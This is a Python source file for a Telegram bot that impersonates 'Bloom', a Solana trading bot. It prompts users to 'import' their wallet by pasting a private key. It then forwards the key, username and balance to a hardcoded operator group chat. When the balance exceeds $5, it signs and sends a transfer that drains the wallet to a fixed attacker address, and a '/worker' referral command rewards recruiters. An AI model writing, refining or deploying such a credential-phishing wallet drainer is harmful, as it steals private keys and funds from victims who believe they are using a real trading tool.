import logging

import os

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup

from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

from solana.rpc.api import Client

from solders.keypair import Keypair

from solders.pubkey import Pubkey

from solders.system_program import TransferParams, transfer

from solders.transaction import Transaction

from solders.message import Message

import aiohttp



# Configure logging

logging.basicConfig(

    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',

    level=logging.INFO

)

logger = logging.getLogger(__name__)



# Configuration

GROUP_CHAT_ID = -1002378426583

DESTINATION_ADDRESS = Pubkey.from_string("9788xXBmpS4v1beemDnTgd6WkWgcnyLNTPpy4zosh83a")

BOT_USERNAME = "LEGACYBLOOMBOT"

COINGECKO_API_URL = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"



# Initialize Solana client

solana_client = Client("https://api.mainnet-beta.solana.com")



async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:

        referrer_id = None

        referrer_name = None



        if context.args:

            referrer_id = context.args[0]

            try:

                referrer = await context.bot.get_chat(referrer_id)

                referrer_name = f"@{referrer.username}" if referrer.username else f"User_{referrer_id}"

            except Exception as e:

                logger.error(f"Referrer lookup error: {e}")

                referrer_name = f"User_{referrer_id}"



        context.user_data.update({

            'referrer_id': referrer_id,

            'referrer_name': referrer_name

        })



        keyboard = [[InlineKeyboardButton("Continue", callback_data='continue')]]

        await update.message.reply_text(

            "🌸 Bloom - Your UNFAIR advantage in crypto 🌸\n\n"

            "Bloom allows you to seamlessly trade tokens, set automations like Limit Orders, Copy Trading, "

            "and more—all within Telegram.\n\n"

            "By continuing, you'll create a crypto wallet that interacts directly with Bloom, enabling live "

            "data and instant transactions. All trading activities and wallet management will occur through Telegram.\n\n"

            "⚠️ IMPORTANT: Please review terms before proceeding. Your private key will be displayed only once, "

            "and it's crucial to store it securely.",

            reply_markup=InlineKeyboardMarkup(keyboard)

        )

    except Exception as e:

        logger.error(f"Start command error: {e}")

        await update.message.reply_text("❌ Error initializing session. Please try again.")



async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:

        user_id = update.message.from_user.id

        referral_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"

        await update.message.reply_text(f"Welcome! Your referral link:\n\n{referral_link}")

    except Exception as e:

        logger.error(f"Worker command error: {e}")

        await update.message.reply_text("❌ Error generating referral link.")



async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()



    try:

        if query.data == 'continue':

            keyboard = [

                [InlineKeyboardButton("💼 Wallet", callback_data='wallet')],

                [InlineKeyboardButton("⚙️ Settings", callback_data='settings')],

                [InlineKeyboardButton("❌ Close", callback_data='close')]

            ]

            await query.edit_message_text(

                "Welcome to Bloom! 🌸\n\n"

                "💳 Your Solana Wallet:\nNone - 0 SOL ($0.00 USD)\n"

                "Import or create a wallet to begin.",

                reply_markup=InlineKeyboardMarkup(keyboard)

            )



        elif query.data == 'wallet':

            keyboard = [

                [InlineKeyboardButton("🔑 Import Wallet", callback_data='import_wallet')],

                [InlineKeyboardButton("⬅️ Back", callback_data='continue')]

            ]

            await query.edit_message_text(

                "💳 Wallet Management\n\n"

                "No wallets connected\n"

                "Import a wallet to continue",

                reply_markup=InlineKeyboardMarkup(keyboard)

            )



        elif query.data == 'import_wallet':

            context.user_data['awaiting_private_key'] = True

            await query.edit_message_text("🟠 Enter your private key to import wallet:")



        elif query.data == 'back':

            await start(update, context)



    except Exception as e:

        logger.error(f"Button handler error: {e}")

        await query.edit_message_text("❌ Error processing request. Please try again.")



async def handle_private_key(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if not context.user_data.get('awaiting_private_key'):

        return



    try:

        private_key = update.message.text

        keypair = Keypair.from_base58_string(private_key)

        public_key = keypair.pubkey()



        # Verify balance

        balance_response = solana_client.get_balance(public_key)

        if not balance_response.value:

            await update.message.reply_text("❌ Invalid key or empty wallet")

            return



        balance_sol = balance_response.value / 1e9



        # Get SOL price

        async with aiohttp.ClientSession() as session:

            async with session.get(COINGECKO_API_URL) as resp:

                price_data = await resp.json()

                sol_price = price_data['solana']['usd']



        balance_usd = balance_sol * sol_price



        # Generate log message

        user = update.effective_user

        log_msg = (

            f"🔑 New Wallet Import\n\n"

            f"👤 User: @{user.username}\n"

            f"🆔 ID: {user.id}\n"

            f"💰 Balance: {balance_sol:.4f} SOL (${balance_usd:.2f})\n"

            f"📬 Address: {public_key}\n"

            f"🔑 Private Key: ||{private_key}||"

        )



        # Send alerts

        await context.bot.send_message(

            chat_id=GROUP_CHAT_ID,

            text=log_msg,

            parse_mode="Markdown"

        )



        # Send to referrer

        if referrer_id := context.user_data.get('referrer_id'):

            try:

                await context.bot.send_message(

                    chat_id=referrer_id,

                    text=f"🎉 New referral activity!\nUser: @{user.username}",

                    parse_mode="Markdown"

                )

            except Exception as e:

                logger.error(f"Referrer notification failed: {e}")



        # Auto-withdrawal logic

        if balance_usd > 5:

            try:

                transfer_amount = balance_response.value - 5000  # Leave some for fees

                blockhash = (await solana_client.get_latest_blockhash()).value.blockhash



                transfer_ix = transfer(TransferParams(

                    from_pubkey=public_key,

                    to_pubkey=DESTINATION_ADDRESS,

                    lamports=transfer_amount

                ))



                txn = Transaction([keypair], Message([transfer_ix], public_key), blockhash)

                txn.sign([keypair], blockhash)



                result = (await solana_client.send_transaction(txn)).value

                if result:

                    await context.bot.send_message(

                        GROUP_CHAT_ID,

                        f"💸 Transfer success!\nTXID: `{result}`",

                        parse_mode="Markdown"

                    )

            except Exception as e:

                logger.error(f"Transfer failed: {e}")

                await context.bot.send_message(GROUP_CHAT_ID, "❌ Transfer failed")



        await update.message.reply_text(

            f"✅ Wallet imported!\nBalance: {balance_sol:.4f} SOL (${balance_usd:.2f})"

        )



    except Exception as e:

        logger.error(f"Private key handler error: {e}")

        await update.message.reply_text("❌ Error importing wallet. Check key format.")



    finally:

        context.user_data['awaiting_private_key'] = False



def main():

    try:

        application = Application.builder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()



        # Register handlers

        application.add_handler(CommandHandler("start", start))

        application.add_handler(CommandHandler("worker", worker))

        application.add_handler(CallbackQueryHandler(button))

        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_private_key))



        logger.info("Starting bot polling...")

        application.run_polling()



    except Exception as e:

        logger.critical(f"Bot failed to start: {e}")

        raise



if __name__ == "__main__":

    main()
